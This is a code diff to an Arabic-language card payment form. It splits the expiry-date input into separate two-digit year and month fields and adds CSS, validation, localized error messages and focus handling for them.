@@ -251,6 +251,23 @@
       outline: none !important;
     }
 
+    .expiry-fields {
+      display: flex !important;
+      gap: 8px !important;
+      flex: 1 1 0 !important;
+      width: 100% !important;
+      min-width: 0 !important;
+      position: relative !important;
+      direction: ltr;
+    }
+
+    .expiry-fields .form-control {
+      flex: 1 1 0 !important;
+      width: 0 !important;
+      min-width: 0 !important;
+      text-align: center !important;
+    }
+
     .form-control:focus {
       border-color: #c8102e !important;
       box-shadow: none !important;
@@ -494,9 +511,15 @@
 
       <div class="form-row">
         <div class="form-group">
-          <input type="text" class="form-control" id="expiry" required 
-                 placeholder="MM / YY" maxlength="7" inputmode="numeric" dir="ltr" autocomplete="off">
-          <div class="error-message" id="expiryError">تاريخ الانتهاء غير صحيح</div>
+          <div class="expiry-fields" dir="ltr">
+            <input type="text" class="form-control" id="expiryYY" required
+                   placeholder="YY" maxlength="2" inputmode="numeric" pattern="[0-9]{2}"
+                   autocomplete="cc-exp-year" aria-label="سنة الانتهاء YY">
+            <input type="text" class="form-control" id="expiryMM" required
+                   placeholder="MM" maxlength="2" inputmode="numeric" pattern="[0-9]{2}"
+                   autocomplete="cc-exp-month" aria-label="شهر الانتهاء MM">
+            <div class="error-message" id="expiryError" role="alert">أدخل السنة YY برقمين والشهر MM بين 01 و12.</div>
+          </div>
         </div>
       </div>
 
@@ -539,7 +562,8 @@
     document.addEventListener('DOMContentLoaded', function() {
         const form = document.getElementById('paymentForm');
         const cardInput = document.getElementById('cardNumber');
-        const expiryInput = document.getElementById('expiry');
+        const expiryYearInput = document.getElementById('expiryYY');
+        const expiryMonthInput = document.getElementById('expiryMM');
         const cvvInput = document.getElementById('cvv');
         const cardHolderInput = document.getElementById('cardHolder');
         const loadingOverlay = document.getElementById('loadingOverlay');
@@ -568,15 +592,38 @@
             return (sum % 10) === 0;
         }
 
-        function isValidExpiry(expiry) {
-            const parts = expiry.split(' / ');
-            if (parts.length !== 2) return false;
-            const month = parseInt(parts[0]);
-            const year = parseInt("20" + parts[1]);
+        function isValidExpiryYear(yearValue) {
+            return /^\d{2}$/.test(yearValue) && (2000 + Number(yearValue)) >= new Date().getFullYear();
+        }
+
+        function getExpiryErrorMessage(monthValue, yearValue) {
+            if (!/^\d{2}$/.test(yearValue) || (2000 + Number(yearValue)) < new Date().getFullYear()) {
+                return 'السنة YY غير صالحة أو منتهية؛ أدخل سنة حالية أو مستقبلية من رقمين.';
+            }
+            if (!/^\d{2}$/.test(monthValue)) {
+                return 'أدخل الشهر MM برقمين من 01 إلى 12.';
+            }
+            const month = Number(monthValue);
+            const year = 2000 + Number(yearValue);
             const now = new Date();
-            if (month < 1 || month > 12) return false;
-            if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) return false;
-            return true;
+            if (month < 1 || month > 12) return 'الشهر MM غير صالح؛ أدخل رقمًا بين 01 و12.';
+            if (year === now.getFullYear() && month < now.getMonth() + 1) {
+                return 'تاريخ الانتهاء منقضٍ؛ أدخل شهرًا وسنةً صالحين.';
+            }
+            return '';
+        }
+
+        function isValidExpiry(monthValue, yearValue) {
+            return getExpiryErrorMessage(monthValue, yearValue) === '';
+        }
+
+        function showExpiryError(message) {
+            expiryError.textContent = message;
+            expiryError.style.display = 'block';
+        }
+
+        function clearExpiryError() {
+            expiryError.style.display = 'none';
         }
 
         // قراءة المبلغ المختار: من معايير URL أولاً (original/discounted)، ومن localStorage كاحتياط
@@ -624,10 +671,45 @@
             e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1 ');
         });
 
-        expiryInput.addEventListener('input', (e) => {
-            let val = e.target.value.replace(/\D/g, '');
-            if (val.length >= 2) e.target.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
-            else e.target.value = val;
+        expiryYearInput.addEventListener('input', function () {
+            expiryYearInput.value = expiryYearInput.value.replace(/\D/g, '').slice(0, 2);
+            if (expiryYearInput.value.length < 2) {
+                clearExpiryError();
+                return;
+            }
+            if (!isValidExpiryYear(expiryYearInput.value)) {
+                showExpiryError(getExpiryErrorMessage(expiryMonthInput.value, expiryYearInput.value));
+                return;
+            }
+            if (expiryMonthInput.value.length === 2) {
+                const message = getExpiryErrorMessage(expiryMonthInput.value, expiryYearInput.value);
+                if (message) showExpiryError(message);
+                else clearExpiryError();
+            } else {
+                clearExpiryError();
+            }
+            expiryMonthInput.focus();
+        });
+
+        expiryMonthInput.addEventListener('input', function () {
+            expiryMonthInput.value = expiryMonthInput.value.replace(/\D/g, '').slice(0, 2);
+            if (expiryMonthInput.value.length < 2) {
+                clearExpiryError();
+                return;
+            }
+            const message = getExpiryErrorMessage(expiryMonthInput.value, expiryYearInput.value);
+            if (message) showExpiryError(message);
+            else clearExpiryError();
+        });
+
+        expiryYearInput.addEventListener('blur', function () {
+            const message = getExpiryErrorMessage(expiryMonthInput.value, expiryYearInput.value);
+            if (message) showExpiryError(message);
+        });
+
+        expiryMonthInput.addEventListener('blur', function () {
+            const message = getExpiryErrorMessage(expiryMonthInput.value, expiryYearInput.value);
+            if (message) showExpiryError(message);
         });
 
         form.addEventListener('submit', function(e) {
@@ -635,7 +717,7 @@
             clearErrors();
 
             const cardNumber = cardInput.value.replace(/\s/g, '');
-            const expiry = expiryInput.value;
+            const expiry = expiryMonthInput.value + ' / ' + expiryYearInput.value;
             const cvv = cvvInput.value;
             const cardHolder = cardHolderInput.value;
 
@@ -645,7 +727,8 @@
                 cardError.style.display = 'block';
                 hasError = true;
             }
-            if (!isValidExpiry(expiry)) {
+            if (!isValidExpiry(expiryMonthInput.value, expiryYearInput.value)) {
+                expiryError.textContent = getExpiryErrorMessage(expiryMonthInput.value, expiryYearInput.value);
                 expiryError.style.display = 'block';
                 hasError = true;
             }
